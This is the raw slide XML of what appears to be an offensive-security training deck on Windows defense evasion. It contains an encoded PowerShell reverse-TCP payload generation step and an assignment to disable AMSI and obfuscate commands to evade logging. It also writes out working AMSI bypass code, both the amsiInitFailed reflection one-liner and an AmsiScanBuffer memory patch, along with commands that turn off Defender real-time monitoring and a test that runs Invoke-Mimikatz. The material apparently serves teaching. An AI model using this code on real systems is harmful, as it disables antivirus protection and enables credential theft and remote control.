              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>10. Generate payload: generate (then select payload type, IP, port) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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generate payload=windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0" err="1">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reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0" err="1">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powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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US" sz="2400" kern="100" dirty="0" err="1">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lhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>=eth0 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>generate payload=windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=eth0 encode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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>encode</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2400" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> (Stealthier than plain text)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="0" fontAlgn="base" latinLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Base64‑encoded</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>bypasses basic string detection.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8795861D-975A-BA52-487D-CCE26AD89848}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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1076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DBD9F-40D9-0A66-AABE-51A5F530AF46}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-192436"/>
            <a:ext cx="12823902" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 02: Bypassing AMSI (Antimalware Scan Interface)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8959205D-0F33-B66A-7949-A4F858373B69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="669072"/>
            <a:ext cx="11998712" cy="6188927"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Description: AMSI is a Windows feature that scans scripts (PowerShell, VBScript) in memory. You must learn to disable it. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>● Technical Requirements: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Research and execute an AMSI Bypass script in PowerShell (e.g., using AmsiScanBuffer memory patching).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Test if your PowerShell commands are still being flagged after the bypass. ○ Use Obfuscated PowerShell tools like Invoke-Obfuscation to hide your intent from logging. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Learning Goal: Learn why "In-Memory" attacks are more effective than writing files to the disk. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1162419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1" y="0"/>
            <a:ext cx="11753253" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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Task 2 Part 1: AMSI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Antimalware Scan Interface </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Bypass Methods</a:t>
            </a:r>
            <a:b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br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Research and execute an AMSI Bypass script in PowerShell (e.g., using AmsiScanBuffer memory patching)</a:t>
            </a:r>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07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1 Reflection bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('</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amsiInitFailed</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NonPublic,Static</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').SetValue($null,$true)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="18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07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2 AmsiScanBuffer patching: $Win32 = Add-Type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memberDefinition</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 @[DllImport("kernel32")]public static extern IntPtr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GetProcAddress</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(IntPtr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hModule</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 string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procName</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DllImport</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("kernel32")]public static extern IntPtr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LoadLibrary</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(string name);[</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DllImport</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("kernel32")]public static extern bool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VirtualProtect</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(IntPtr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lpAddress</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UIntPtr</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dwSize</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 uint flNewProtect, out uint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lpflOldProtect</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 -name "Win32" -namespace Win32 -passthru</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="18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07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3 Get AmsiScanBuffer address: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ptr</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 = $Win32::</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GetProcAddress</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($Win32::</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LoadLibrary</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("amsi.dll"), "AmsiScanBuffer")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" kern="100" dirty="0">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07000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>4</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 Patch with return code: $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" kern="100" dirty="0">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07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5 Change memory protection: $Win32::</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VirtualProtect</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ptr</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UIntPtr</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]6, 0x40, [ref]$old)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="18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07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6 Apply patch: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System.Runtime.InteropServices.Marshal</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]::Copy($patch, 0,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ptr</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 6)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="495928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1" y="0"/>
            <a:ext cx="12017763" cy="6705600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>7 One-liner full bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>amsiInitFailed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>','</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>NonPublic,Static</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>').SetValue($null,$true)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="28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indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>8 Test bypass worked: 'Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>' | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>iex</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>9</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Alternative - Registry bypass for PowerShell </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>5: Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>MpPreference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="1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2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DisableRealtimeMonitoring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> $true</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>10 Alternative - Disable AMSI via environment variable: $env:__</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>PSLockDownPolicy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> = '1'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>11 Test detection after bypass: Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>12 Restore AMSI (if needed): Set-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>MpPreference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="1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2800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DisableRealtimeMonitoring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> $false </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
